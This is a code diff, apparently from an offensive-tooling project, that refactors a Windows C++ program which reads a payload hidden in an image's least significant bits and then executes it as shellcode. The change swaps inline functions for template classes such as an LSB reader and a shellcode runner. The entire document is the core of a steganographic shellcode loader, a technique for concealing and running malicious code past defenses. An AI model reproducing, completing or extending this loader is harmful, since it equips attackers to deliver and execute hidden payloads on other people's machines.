@@ -2,19 +2,23 @@
 
 int _tmain(int argc, TCHAR** argv) {
 
-    if (argc == 3) {
-        int payload_bits = _ttoi(argv[1]);
-        char * payload_data = new char[payload_bits / 8];
-
+    if (argc == 3) {      
         // Init Gdiplus
         GdiplusStartupInput gdiplusStartupInput;
         ULONG_PTR gdiplusToken;
         GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
         // Do the job
-        Gdiplus::Bitmap* bmp = load_image(argv[2]);
-        read_image(bmp, payload_data, payload_bits);
-        run(payload_data, payload_bits);
+
+        // TEMPLATES GO HERE
+        auto img = Reader::Local(argv[2]);
+        img.loadImage();
+
+        auto alg = Reader::LSB(img.bm, _ttoi(argv[1]));
+        alg.readImage();
+
+        auto pld = Reader::Shellcode(alg.payload_data, alg.payload_bits);
+        pld.Run();
 
         // Shutdown Gdiplus
         GdiplusShutdown(gdiplusToken);
